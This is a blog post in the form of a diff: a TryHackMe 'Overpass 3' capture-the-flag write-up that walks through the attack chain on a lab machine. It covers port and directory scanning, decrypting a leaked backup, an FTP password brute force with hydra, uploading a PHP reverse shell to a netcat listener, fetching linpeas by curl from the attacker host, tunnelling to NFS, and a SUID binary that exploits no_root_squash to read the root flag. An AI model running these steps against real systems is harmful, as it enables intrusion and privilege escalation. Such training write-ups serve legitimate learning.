@@ -1,0 +1,471 @@
+---
+layout: post
+title:  "Tryhackme: Overpass 3"
+date:   2021-04-03 11:45:56 +0200
+categories: tryhackme
+---
+
+## Nmap Scan ##
+
+### Initial Port Scan ###
+```
+sudo nmap -sS -p- -Pn -T4 -vv 10.10.151.225
+```
+```
+Nmap scan report for 10.10.151.225
+Host is up, received user-set (0.057s latency).
+Scanned at 2021-04-04 04:25:32 EDT for 156s
+Not shown: 65532 filtered ports
+Reason: 65370 no-responses and 162 admin-prohibiteds
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+```
+
+Nothing unusual here. After the targeted scan we could try and enuemrate ```FTP```. But, unfortuantely, it would seem that anonymous logins are disabled, thus we will need some valid credentials.
+
+### FTP anonymous login ###
+```
+$ ftp 10.10.151.225
+Connected to 10.10.151.225.
+220 (vsFTPd 3.0.3)
+Name (10.10.151.225:kali): anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed. 
+```
+
+### Web server ###
+And the web server doesn't seem to give anything interesting, other than some potential usernames
+
+![webserver](/assets/images/Overpass3/webserver.png)
+
+### SSH login ###
+
+Unfortunately, we won't be able to bruteforce ```SSH``` logins since there is only the key based authentication enabled:
+
+```
+$ ssh paradox@10.10.151.225              
+The authenticity of host '10.10.151.225 (10.10.151.225)' can't be established.
+ECDSA key fingerprint is SHA256:Zc/Zqa7e8cZI2SP2BSwt5iLz5wD3XTxIz2SLZMjoJmE.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.151.225' (ECDSA) to the list of known hosts.
+paradox@10.10.151.225: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
+```
+
+### Targeted Port Scan ###
+```
+sudo nmap -sSCV -T4 -vv 10.10.151.225 -p21,22,80
+```
+```
+Nmap scan report for 10.10.151.225
+Host is up, received reset ttl 63 (0.064s latency).
+Scanned at 2021-04-04 04:27:07 EDT for 11s
+
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfSHQR3OtIeAUFx18phN/nfAIQ2uGHuJs0epoqF184E4Xr8fkjSFJHdA6GsVyGUjdlPqylT8Lpa+UhSSegb8sm1So8Nz42bthsftsOxMQVb/tpQzMUfjcxQOiyVmgxfEqs2Zzdv6GtxwgZWhKHt7T369ejxnVrZhn0m6jzQNfRhVoQe/jC20RKvBf8l8s6/SusbZR5SFfsg71KyrSKOXOxs12GhXkdbP32K3sXVEpWgfCfmIZAc2ZxNtL5uPCM4AOfjIFJHl1z9EX04ZjQ1rMzzOh9pD/b+W2mXt2nQGzRPnc8LyGDE0hFtw4+lBCoiH8zIt14S7dwbFFV1mWxbtZXVf7JhPiZDM2vBfqyowsDZ5oc2qyR+JEU4pqeVhRygs41isej/el19G8+ehz4W07KR97eM2omB25JehO7E4tpX1l8Imjs1XjqhhVuGE2tru/p62SRQOKzRZ19MCIFPxleSLorrHq/uuKdvd8j6rm0A9BrCsiB6gmPfal6Kr55vlU=
+|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAPAji9Nkb2U9TeP47Pz7BEa943WGOeu5XrRrTV0+CS0eGfNQyZkK6ZICNdeov65c2NWFPFsZTFjO8Sg+e2n/lM=
+|   256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM/U6Td7C0nC8tiqS0Eejd+gQ3rjSyQW2DvcN0eoMFLS
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.37 ((centos))
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos)
+|_http-title: Overpass Hosting
+Service Info: OS: Unix
+```
+
+## Directory Bruteforcing ##
+```
+gobuster dir -u http://10.10.151.225/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 16
+```
+```
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.151.225/
+[+] Threads:        16
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/04/04 04:28:32 Starting gobuster
+===============================================================
+/backups (Status: 301)
+===============================================================
+2021/04/04 04:42:51 Finished
+===============================================================
+```
+
+### Investigating backups ###
+
+Looks like we have an interesting finding inside the ```/backups``` directory previously discovered.
+
+![backups](/assets/images/Overpass3/backups.png)
+
+```
+$ wget http://10.10.151.225/backups/backup.zip                                                                                                                                                   
+--2021-04-04 04:44:10--  http://10.10.151.225/backups/backup.zip
+Connecting to 10.10.151.225:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 13353 (13K) [application/zip]
+Saving to: ‘backup.zip’
+
+backup.zip                                        100%[============================================================================================================>]  13.04K  --.-KB/s    in 0.06s
+```
+
+```
+$ unzip backup.zip 
+Archive:  backup.zip
+ extracting: CustomerDetails.xlsx.gpg  
+  inflating: priv.key
+```
+
+Looks like we have an encrypted ```xlsx``` file and its encryption private key.
+
+```
+$ gpg --import priv.key                                                                                      
+gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
+gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
+gpg: key C9AE71AB3180BC08: secret key imported
+gpg: Total number processed: 1
+gpg:               imported: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+                                                                                                                                                                                                       
+$ gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
+gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
+      "Paradox <paradox@overpass.thm>"
+```
+
+Now we also have a confirmed username and a domain name. Let's checkout the decrypted file.
+
+![xlsx](/assets/images/Overpass3/xlsx.png)
+
+We got ourselves a mini database with usernames and passwords! Great! Let's use these to bruteforce ```FTP```.
+
+## FTP Bruteforce ##
+
+```
+$ hydra -L /tmp/usernames -P /tmp/passwords -t 16 10.10.151.225 ftp
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-04 04:54:30
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
+[DATA] attacking ftp://10.10.151.225:21/
+[21][ftp] host: 10.10.151.225   login: paradox   password: ???????
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-04 04:54:35
+```
+
+## FTP Enumeration ##
+
+Let's login to ```FTP``` with the previously found credentials and see what we can find.
+
+```
+$ ftp 10.10.151.225
+Connected to 10.10.151.225.
+220 (vsFTPd 3.0.3)
+Name (10.10.151.225:kali): paradox
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+```
+
+Great! The credentials do work.
+
+```
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    3 48       48             94 Nov 17 23:54 .
+drwxrwxrwx    3 48       48             94 Nov 17 23:54 ..
+drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
+-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
+-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
+-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
+-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
+226 Directory send OK.
+```
+
+Looks like we have all the permissions enabled for the current directory! This means we could upload a revershe shell and get in!
+
+## Setting Foothold ##
+
+I am going to upload Kali's already existing php reverse shell.
+
+```
+ftp> put shell.php 
+local: shell.php remote: shell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5494 bytes sent in 0.00 secs (47.2026 MB/s)
+```
+
+Now, all we need is to start a netcat listener on the port we assigned inside the php revershe shell and we will get a shell back once we make a GET request to that file (either through the browser, ```cURL```, ```BurpSuite``` or some other tool).
+
+```
+$ nc -nlvp 1234       
+listening on [any] 1234 ...
+connect to [10.9.136.138] from (UNKNOWN) [10.10.151.225] 33218
+Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 10:03:47 up  1:01,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: cannot set terminal process group (856): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-4.4$ 
+```
+
+Success!
+
+### Shell Stabilisation ###
+
+```
+sh-4.4$ python3 -c 'import pty; pty.spawn("/bin/bash");'
+python3 -c 'import pty; pty.spawn("/bin/bash");'
+bash-4.4$ export TERM=xterm
+export TERM=xterm
+bash-4.4$ ^Z
+zsh: suspended  nc -nlvp 1234
+                                                                                                                                                                                                       
+$ stty raw -echo; fg                                                                                                                                                                       148 ⨯ 1 ⚙
+[1]  + continued  nc -nlvp 1234
+
+bash-4.4$ ^C
+bash-4.4$ 
+```
+
+Now we can safely ```CTRL-C```, without exiting the shell.
+
+Let's look for flags!
+
+```
+bash-4.4$ find / -name "*flag*" 2>/dev/null                                                                                                                                                            
+/proc/sys/kernel/acpi_video_flags                                                                                                                                                                      
+/proc/kpageflags                                                                                                                                                                                       
+/sys/devices/pnp0/00:06/tty/ttyS0/flags                                                                                                                                                                
+/sys/devices/platform/serial8250/tty/ttyS2/flags                                                                                                                                                       
+/sys/devices/platform/serial8250/tty/ttyS3/flags                                                                                                                                                       
+/sys/devices/platform/serial8250/tty/ttyS1/flags                                                                                                                                                       
+/sys/devices/virtual/net/lo/flags                                                                                                                                                                      
+/sys/devices/vif-0/net/eth0/flags                                                                                                                                                                      
+/sys/module/scsi_mod/parameters/default_dev_flags                                                                                                                                                      
+/usr/bin/pflags                                                                                                                                                                                        
+/usr/sbin/grub2-set-bootflag                                                                                                                                                                           
+/usr/share/man/man1/grub2-set-bootflag.1.gz                                                                                                                                                            
+/usr/share/httpd/web.flag
+```
+
+Looks like we can already get our web flag:
+```
+bash-4.4$ cat /usr/share/httpd/web.flag                                                                                                                                                                
+```
+
+## Privilege Escalation ##
+
+### Lateral Movement ###
+Since we know ```paradox```'s credentials we can make a lateral movement to this user and slightly elevate our privileges.
+
+```
+bash-4.4$ su paradox
+Password: 
+[paradox@localhost /]$ whoami
+paradox
+```
+
+### Running linpeas ###
+
+Let's start a local http server and download linpeas to the target machine.
+
+```
+$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+Now, on the target machine we will download the script and run it.
+
+```
+paradox@localhost /]$ curl http://10.9.136.138:8000/linpeas.sh > /tmp/linpeas.sh
+```
+
+
+### Privilege Escalation through NFS Squash ###
+
+```
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                                                                 
+/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
+```
+
+Looks like linpeas found something useful for us. This is weird, since our initial nmap scan didn't reveal any ```NFS``` service running. This must mean it might be behind a firewall.
+Fortunately, we can get around this using an ```SSH Tunnel``` through port 2049, the port usually assigned to ```NFS```.
+
+But first, since only key absed authentication is allowed, we will need to copy our public key to ```paradox```'s authorized keys.
+
+```
+$ ssh-keygen -f /tmp/paradox                                                                                                                                                                   
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /tmp/paradox
+Your public key has been saved in /tmp/paradox.pub
+The key fingerprint is:
+SHA256:fd3g5CnAJz1zjpAuR7gl1g8dqzyx/cbdi+zTZ79pJHg kali@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|            .    |
+|         + + o   |
+|        + % B +  |
+|       . O % @ + |
+|        S O B * .|
+|         o + E o.|
+|            . B o|
+|            .o.o=|
+|            .+o==|
++----[SHA256]-----+
+```
+Now copy the public key to paradox's ```/home/paradox/.ssh/authorized_keys```.
+```
+$ cat /tmp/paradox.pub      
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQComlOpPXR2kTMOLpdnVobvBqpLY/0DFKn+jlcaFMVDNiYHs33pcPIKnnXbJJBuruWFwJvElpKsLVwh+fXlNE9eHjcd/8M6VlPLw5+YymCk/4wRT28vNaBROOD0Lti0V0bVq1LLlXKDu8erK7njNgzZOVfc4HU2dnpp/WfMtUTBzDtAvk73P9HN/Xxn2RA5gHai/Z2KpZ5jfYpUpH6SG7ZFSo/mkRmCICsuWPWWgbGYH6zVInBW9p+xT0fZFvYArdA0sx2vJTH2lZhoHELUU0a0Mg2CoUa0j6g/3qc9MYmIvFBv6UdW/qaatTwsJRG1fd1Yi6eW2b1C80wkcWFWnU1ElGPo0X6tsYi6fpvH60I3GmQggxDl3fbg3O42bw2q59fN83JdIebigUqRNuIF7EBZdaPtRKJYmvqpM7Xj/OddaG+ZQYSnLtqWOFEwLV1iidVezlJ+CqUUp+BnACQ/kZ/K2luxznSCtEgZCHktwvVnoiQ3W4xhymGP6ncWLhYExN0= kali@kali
+```
+
+```
+$ showmount -e localhost                                                                                                                                                                       
+clnt_create: RPC: Unknown host
+```
+
+Looks like something is not working, let's take a look at what is happening.
+
+```
+$ sudo tcpdump -n -i any
+tcpdump: data link type LINUX_SLL2
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
+05:59:34.968918 lo    In  IP 127.0.0.1.33210 > 127.0.0.1.111: Flags [S], seq 1977679846, win 65495, options [mss 65495,sackOK,TS val 1886419806 ecr 0,nop,wscale 7], length 0
+05:59:34.968923 lo    In  IP 127.0.0.1.111 > 127.0.0.1.33210: Flags [R.], seq 0, ack 1977679847, win 0, length 0
+05:59:34.968938 lo    In  IP 127.0.0.1.33212 > 127.0.0.1.111: Flags [S], seq 3184681698, win 65495, options [mss 65495,sackOK,TS val 1886419806 ecr 0,nop,wscale 7], length 0
+05:59:34.968940 lo    In  IP 127.0.0.1.111 > 127.0.0.1.33212: Flags [R.], seq 0, ack 3184681699, win 0, length 0
+```
+
+It looks like ```showmount``` tries to connect to port ```111``` as well and it can't. Let's tunnel through that as well.
+
+```
+$ sudo ssh -L 111:localhost:111 -i /tmp/paradox paradox@10.10.151.225    
+```
+
+```
+$ showmount -e loclahost                                                                                                                                                                         1 ⨯
+clnt_create: RPC: Unknown host
+```
+
+Oh, damn it! It looks like this did not solve the issue, let's start capturing again.
+
+```
+06:03:37.429293 lo    In  IP6 ::1.60224 > ::1.20048: Flags [S], seq 51494938, win 65476, options [mss 65476,sackOK,TS val 64830519 ecr 0,nop,wscale 7], length 0
+06:03:37.429304 lo    In  IP6 ::1.20048 > ::1.60224: Flags [R.], seq 0, ack 51494939, win 0, length 0
+```
+
+This time the port ```20048``` is failing. Let's tunnel that as well...
+
+```
+$ sudo ssh -L 20048:localhost:20048 -i /tmp/paradox paradox@10.10.151.225    
+```
+
+```
+$ showmount -e localhost                                                                                                                                                                         1 ⨯
+Export list for localhost:
+/home/james *
+```
+
+SUCCESS!
+
+Alright! Let's mount this ```NFS```
+
+```
+$ cd /mnt
+$ sudo mkdir james
+$ sudo mount -o nolock -t nfs localhost:/home/james james
+$ cd james
+$ ls
+user.flag
+$ cat user.flag
+```
+
+We got our user flag!
+
+Now, let's put our public key inside james's ```.ssh/authorized_keys``` and log in as james through ```SSH```!
+
+```
+$ ls -la
+total 20
+drwx------ 3 kali kali  112 Nov 17 16:15 .
+drwxr-xr-x 3 root root 4096 Apr  4 05:47 ..
+lrwxrwxrwx 1 root root    9 Nov  8 16:45 .bash_history -> /dev/null
+-rw-r--r-- 1 kali kali   18 Nov  8  2019 .bash_logout
+-rw-r--r-- 1 kali kali  141 Nov  8  2019 .bash_profile
+-rw-r--r-- 1 kali kali  312 Nov  8  2019 .bashrc
+drwx------ 2 kali kali   61 Nov  7 21:20 .ssh
+-rw------- 1 kali kali   38 Nov 17 16:15 user.flag
+$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQComlOpPXR2kTMOLpdnVobvBqpLY/0DFKn+jlcaFMVDNiYHs33pcPIKnnXbJJBuruWFwJvElpKsLVwh+fXlNE9eHjcd/8M6VlPLw5+YymCk/4wRT28vNaBROOD0Lti0V0bVq1LLlXKDu8erK7njNgzZOVfc4HU2dnpp/WfMtUTBzDtAvk73P9HN/Xxn2RA5gHai/Z2KpZ5jfYpUpH6SG7ZFSo/mkRmCICsuWPWWgbGYH6zVInBW9p+xT0fZFvYArdA0sx2vJTH2lZhoHELUU0a0Mg2CoUa0j6g/3qc9MYmIvFBv6UdW/qaatTwsJRG1fd1Yi6eW2b1C80wkcWFWnU1ElGPo0X6tsYi6fpvH60I3GmQggxDl3fbg3O42bw2q59fN83JdIebigUqRNuIF7EBZdaPtRKJYmvqpM7Xj/OddaG+ZQYSnLtqWOFEwLV1iidVezlJ+CqUUp+BnACQ/kZ/K2luxznSCtEgZCHktwvVnoiQ3W4xhymGP6ncWLhYExN0= kali@kali" >> .ssh/authorized_keys
+Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
+[james@localhost ~]$ whoami
+james
+```
+
+Since permissions are also shared, we could compile a SUID binary that would give us the flag!
+
+```
+$ cat main.c 
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+        setuid(0);
+        setgid(0);
+        system("cat /root/root.flag");
+        return 0;
+}
+```
+
+Go ahead and write this source file from your local machine into james's share. Now compile it and give it the right permissions!
+
+```
+$ gcc main.c -o flag
+$ sudo chmod 777 flag
+$ sudo chmod u+s flag
+$ sudo chmod root:root flag
+```
+
+Now, from the target machine:
+
+```
+[james@localhost ~]$ ls -l
+total 28
+-rwsrwxrwx  1 root  root  16704 Apr  4 11:30 flag
+-rw-r--r--  1 james james   122 Apr  4 11:30 main.c
+-rw-------. 1 james james    38 Nov 17 21:15 user.flag
+[james@localhost ~]$ ./flag
+thm{????}
+```
+
+Sucess!
+
+## Conclusion ##
+
+I must say, it was very interesting trying to debug why ```NFS``` wasn't working. Having to analyse the packet exchanges between the two hosts and SSH tunnel accordingly was a good learning experience and offered me a good chance to solve some rarely encountered challenges.
+
